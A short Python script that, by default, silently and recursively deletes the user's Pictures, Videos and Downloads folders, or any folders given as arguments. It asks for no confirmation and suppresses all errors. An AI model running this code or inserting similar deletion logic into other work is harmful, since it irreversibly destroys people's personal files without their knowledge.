#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import shutil
import sys

TARGET_DIRS = [
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Videos"),
    os.path.expanduser("~/Downloads"),
]

def wipe_directory(path):
    try:
        if os.path.exists(path):
            shutil.rmtree(path, ignore_errors=True)
    except Exception:
        pass

def main():
    if len(sys.argv) > 1:
        for folder in sys.argv[1:]:
            wipe_directory(folder)
    else:
        for folder in TARGET_DIRS:
            wipe_directory(folder)

if __name__ == "__main__":
    main()
